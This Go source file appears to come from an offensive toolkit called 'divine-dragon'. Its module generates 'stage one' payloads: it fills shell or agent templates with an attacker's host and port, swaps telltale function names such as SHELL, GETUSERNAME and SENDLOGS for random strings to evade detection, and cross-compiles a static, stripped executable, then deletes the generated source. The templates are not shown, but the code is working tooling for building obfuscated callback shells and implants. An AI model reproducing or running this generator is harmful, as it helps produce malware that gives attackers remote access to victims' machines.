package payload_generator

import (
	"divine-dragon/util"
	"fmt"
	"os/exec"
	"strings"

	"github.com/gobuffalo/packr"
)

type StageOnePayloadGeneratorModule struct {
	host           string
	port           string
	payloadType    string
	platform       string
	arch           string
	executableName string

	logger util.Logger
}

func NewStageOnePayloadGeneratorModule(hostOpt string, portOpt string, payloadTypeOpt string, platformOpt string, archOpt string, executableNameOpt string) *StageOnePayloadGeneratorModule {
	sopgm := StageOnePayloadGeneratorModule{
		host:           hostOpt,
		port:           portOpt,
		payloadType:    payloadTypeOpt,
		platform:       platformOpt,
		arch:           archOpt,
		executableName: executableNameOpt,
	}
	sopgm.logger = util.PayloadGeneratorLogger(false, "")
	return &sopgm
}

func (sopgm *StageOnePayloadGeneratorModule) Run() {
	payloadSource, err := sopgm.preparePayloadSource()
	if err != nil {
		sopgm.logger.Log.Error(err)
	}
	sopgm.logger.Log.Noticef("Your payload for shell was generated in file %s:", sopgm.executableName)
	sopgm.logger.Log.Noticef("See the source code below:\n%s", payloadSource)
	err = sopgm.compilePayload(payloadSource)
	if err != nil {
		sopgm.logger.Log.Error(err)
	}
}

func (sopgm *StageOnePayloadGeneratorModule) preparePayloadSource() (string, error) {
	payloadSource, err := packr.NewBox("./templates/").FindString(sopgm.payloadType + ".go")
	if err != nil {
		return "", fmt.Errorf("can't get template from templates/ folder: %v", err)
	}
	payloadSource = strings.Replace(payloadSource, "HOST", sopgm.host, -1)
	payloadSource = strings.Replace(payloadSource, "PORT", sopgm.port, -1)
	var funcPatterns []string
	if sopgm.payloadType == "agent" {
		funcPatterns = []string{
			"AGENT",
			"CHECKCONNECTION",
			"TRYTOCONNECT",
			"GETMACHINENAME",
			"GETUSERNAME",
			"CHECKJOBS",
			"DOJOBS",
			"WRITETOFILE",
			"RUNJOB",
			"UPDATEJOBSTATUS",
			"SENDLOGS",
		}
	} else {
		funcPatterns = []string{
			"WRITETOFILE",
			"SHELL",
			"FILENAME",
		}
	}
	for _, funcPattern := range funcPatterns {
		payloadSource = strings.Replace(payloadSource, funcPattern, util.RandString(util.RandInt()), -1)
	}
	return payloadSource, nil
}

func (sopgm *StageOnePayloadGeneratorModule) compilePayload(payloadSource string) error {
	payloadSourceFileName := util.RandString(util.RandInt()) + ".go"
	err := util.WriteToFile(payloadSourceFileName, payloadSource)
	if err != nil {
		return err
	}
	out, err := exec.Command("env",
		fmt.Sprintf("GOOS=%s", sopgm.platform),
		fmt.Sprintf("GOARCH=%s", sopgm.arch),
		"go",
		"build",
		"-o",
		sopgm.executableName,
		"-ldflags",
		"-w -s -extldflags=-static",
		payloadSourceFileName).Output()
	if err != nil {
		return err
	}
	if string(out) != "" {
		return fmt.Errorf("can't compile a binary: %s", string(out))
	}
	err = util.RemoveFile(payloadSourceFileName)
	if err != nil {
		return fmt.Errorf("can't delete a file %s: %v", payloadSourceFileName, err)
	}
	return nil
}
